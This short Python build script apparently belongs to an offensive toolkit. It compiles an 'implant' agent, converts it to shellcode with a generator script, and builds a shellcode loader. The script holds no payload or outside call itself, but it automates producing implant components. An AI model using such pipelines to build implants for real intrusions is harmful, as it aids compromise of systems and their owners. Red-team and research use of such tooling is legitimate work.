import subprocess
from pathlib import Path


AGENT_PROJ = Path("implant/Agent/Agent.csproj")
LOADER_PROJ = Path("implant/Loader/Loader.csproj")
AGENT_BIN = Path("server/agent.bin")


def build_agent():
    subprocess.run(["dotnet", "publish", str(AGENT_PROJ), "-c", "Release"],check=True)


def generate_shellcode():
    subprocess.run(["python", "server/shellcode_generator.py"],check=True)


def build_loader():
    subprocess.run(["dotnet", "publish", str(LOADER_PROJ), "-c", "Release"],check=True)


def main():
    print("[*] Building Agent...")
    build_agent()

    print("[*] Generating shellcode...")
    generate_shellcode()

    print("[*] Building Loader...")
    build_loader()

    print(f"[+] Done. Shellcode at {AGENT_BIN}")


if __name__ == "__main__":
    main()